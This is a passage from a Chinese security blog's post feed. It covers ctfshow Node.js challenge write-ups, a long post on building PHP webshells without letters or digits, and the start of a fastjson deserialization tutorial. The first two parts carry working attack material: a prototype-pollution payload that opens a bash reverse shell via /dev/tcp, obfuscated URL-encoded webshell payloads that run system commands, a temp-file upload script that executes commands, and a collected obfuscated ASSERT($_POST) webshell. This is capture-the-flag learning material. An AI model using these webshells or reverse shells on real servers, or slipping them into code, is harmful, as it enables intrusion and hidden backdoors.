class="property">userinfo</span>,req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>
<p>因为这次是复制user.userinfo的对象，所以需要两层<strong>proto</strong>，才能污染到最顶端的值，也就是<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p>
<h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>使用ejsRCE进行反弹shell，但是这次render点在index.js<br>所以对login进行了原型链污染以后，需要在访问一次index.js才能反弹shell</p>
<h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342   web343"></a>web342   web343</h2><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a><br>可以根据这篇文章进行调试<br>核心就是找到可覆盖点（可插入到模板中，且为undefined）</p>
<blockquote>
<p><strong>为什么要undefined</strong><br>因为只有在某个对象他没有定义这个变量的时候才会向上的prototype去寻找，否则就算污染了原型链也是没法利用的</p>
</blockquote>
<p>注意这里的payload要用execSync，不能用exec</p>
<h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>这题关键是多个相同的参数传递过去，nodejs会将其拼接为列表的形式<br><img src="/2022/11/28/ctfshow-nodejs/3.jpg" alt><br><img src="/2022/11/28/ctfshow-nodejs/4.jpg" alt><br>这里传参的时候要把payload复制到burp里面，如果浏览器直接访问，会出一些编码错误<br>payload<br><code>query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>nodejs</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell-奇淫技巧（php）</title>
    <url>/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/</url>
    <content><![CDATA[<h2 id="无数字字母获取所有数字"><a href="#无数字字母获取所有数字" class="headerlink" title="无数字字母获取所有数字"></a>无数字字母获取所有数字</h2><p>通过boolean类型进行加减<br><span id="more"></span><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="literal">true</span>+<span class="literal">true</span>) == <span class="number">2</span>);         <span class="comment">// D:\phpstudy_pro\WWW\a.php:2:boolean true</span></span><br></pre></td></tr></table></figure><br>从两个真相加得到了2，那么布尔类型的都应该都可以进行加减<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单引号</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 未定义变量</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 未定义常量</span></span><br><span class="line"><span class="variable">$_</span> = _==_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 中括号</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 获取0</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>-<span class="variable">$_</span>;                         <span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 获取false</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);                       <span class="comment">// D:\phpstudy_pro\WWW\a.php:3:boolean false</span></span><br></pre></td></tr></table></figure><br>总而言之就是拿着两个类型去比较，当然也可以用大于号小于号之类的去比较<br>当然有时候未定义的变量、常量，也可以当作false来用<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;kaikaix&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$b</span>];                        <span class="comment">//输出 k</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[_];                         <span class="comment">//输出 k</span></span><br></pre></td></tr></table></figure></p>
<h2 id="无数字字母获取所有的字母"><a href="#无数字字母获取所有的字母" class="headerlink" title="无数字字母获取所有的字母"></a>无数字字母获取所有的字母</h2><h3 id="数组拼接"><a href="#数组拼接" class="headerlink" title="数组拼接"></a>数组拼接</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.[];                         <span class="comment">//字符串与数组拼接变成Array</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>];                  <span class="comment">//false代表0，这里取到A</span></span><br><span class="line"><span class="variable">$___</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>);  <span class="comment">//3个true相加为3</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="variable">$___</span>];                     <span class="comment">//获取到a</span></span><br></pre></td></tr></table></figure>
<p>剩下的操作就是一些自加操作了，这样就可以获取到所有的字母了<br>在php中字母是可以自加的（不能自减），但是特殊字符不行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//变成b</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//还是(</span></span><br></pre></td></tr></table></figure><br>这里我突发奇想，想看看class类型能不能拼接出Object字符串，null能不能拼接出字符串null，然而并不行，那么就只能先告一段落</p>
<h3 id="利用数学错误"><a href="#利用数学错误" class="headerlink" title="利用数学错误"></a>利用数学错误</h3><p>php中0/0会返回NAN，1/0会返回INF<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//false/false 报错 NAN</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//将报错与字符串拼接，转换为字符串NAN</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//打印出 NAN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//true/false报错 INF</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//将报错与字符串拼接，转换为字符串INF</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//打印INF</span></span><br></pre></td></tr></table></figure><br>当然上面的代码还是有点长的，可以用undefined的常量或变量相除，就会缩短代码长度<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常量</span></span><br><span class="line"><span class="variable">$_</span>=_/_;</span><br><span class="line"><span class="variable">$_</span>.=_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN_</span></span><br><span class="line"><span class="comment">//缩短代码</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//变量</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN</span></span><br></pre></td></tr></table></figure><br>这样可以获取到NAN的字符串，那么提取第一个也就是N<br>因为POST这几个字母都在N后面，那么进行一些自加操作就可以获取到$_POST了，我这里抄一下别的师傅的代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(_/_._)[<span class="number">0</span>];                      <span class="comment">//直接拼接成字符串并切片</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>;                            <span class="comment">//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>.<span class="variable">$o</span>;                         <span class="comment">//$o=&gt;PO,$a=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//R</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POS,$a=&gt;S</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POST,$a=&gt;T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$o</span>;                            <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);                     <span class="comment">//$_POST[0]($_POST[_]);</span></span><br></pre></td></tr></table></figure><br>在这里的变量名称最后替换成特殊字符就可以了<br>比如下图这些<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/1.jpg" alt><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Ñ</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Ñ</span>;</span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</code></p>
<h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p>当php安装了gettext扩展，这个扩展中_()相当于gettext()<br>相关文档 <a href="https://www.php.net/manual/en/book.gettext.php">https://www.php.net/manual/en/book.gettext.php</a><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];                       <span class="comment">//获取到N</span></span><br></pre></td></tr></table></figure><br>最后一些自加的顺序操作可以让你的webshell更短，但是这里就不细说了，因为我感觉有点没必要<br>可以参考这篇文章的底部<br><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah</a><br>直接上代码<br>72位字符<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f1agaaa</code></p>
<p>68位字符<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//巧妙的把两次$_++放在一起</span></span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</code></p>
<h3 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h3><p>具体参考p神文章<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ls&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><br>核心原理就是上传的文件会临时保存到/tmp/phpXXXXXX中，后面的X是随机字符<br>[@-[]这个代表?是从@-[，也就是所有的大写字母<br>那么命令执行就可以去执行这个临时文件</p>
<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="或"><a href="#或" class="headerlink" title="或"></a>或</h3><p>主要是通过特殊字符进行异或运算得到正常字符<br>比如<br><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)()</code><br>运算完以后就是<br><code>phpinfo()</code><br>这里有相关的代码<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96</a><br>当然双引号可以替换为单引号<br>如果是直接复制到php文件中去执行的话需要先url decode才行<br><code>(&quot;    &quot;|&quot;```````&quot;)();</code></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或与或的原理类似<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96</a></p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>这里用的yu22x的脚本<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D</a><br>这里是用php命令行去执行<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/2.jpg" alt><br>如果没有参数可以把后面括号里面的东西删除<br><code>(~%8F%97%8F%96%91%99%90)();</code><br>同理，如果想在php中执行，也要先urldecode</p>
<h2 id="收录一下其他人的脚本"><a href="#收录一下其他人的脚本" class="headerlink" title="收录一下其他人的脚本"></a>收录一下其他人的脚本</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson初学</title>
    <url>/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这篇文章就是来简单理解一下他反序列化的原理，内核实现<br><span id="more"></span><br>在调试fastjson的时候可能会遇到Source code does not match the bytecode的情况（IJ），我的解决方案是下载源码去阅读</p>
<h2 id="fastjson基本用法"><a href="#fastjson基本用法" class="headerlink" title="fastjson基本用法"></a>fastjson基本用法</h2><p>文章的fastjson版本<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>fastjson主要是用来序列化与反序列化JavaBean<br>下面是一个简单的JavaBean对象<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>下面将用fastjson来序列化上面的对象，将他们转换为json<br>新建一个文件StudentSer.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/1.jpg" alt><br>打印了getAge和getName，说明在序列化的时候会对getXxxx进行调用<br>当然不止toJSONString，还有toJSONBytes，具体可以看JSON.class类中的成员方法</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>接下来就是反序列化了，这里的反序列化类似php，并不是读取字节文件，而是读取json格式的字符串<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">        System.out.printf(<span class="string">&quot;Parse had done =&gt; %s\n&quot;</span>,JSON.parse(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject(Student.class) has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson,Student.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/2.jpg" alt><br>在这里进行了三次反序列化<br>主要就是parse和parseObject<br>但是观察parseObject的源码，其实也是对parse的一次封装，核心还是调用了parse，主要区别就是对parse后返回的obj调用了一次toJSON，调用toJSON就会调用类中所有get，set方法<br><figure 